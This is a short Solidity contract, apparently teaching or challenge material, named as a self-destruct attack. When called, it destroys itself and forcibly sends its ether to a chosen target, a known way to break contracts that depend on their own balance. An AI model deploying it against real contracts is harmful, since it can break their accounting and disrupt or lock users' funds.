// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDesructAttack {
    address target;

    constructor(address _tareget) {
        target = _tareget;
    }

    function attack() public payable {
        selfdestruct(payable(target));
    }
}
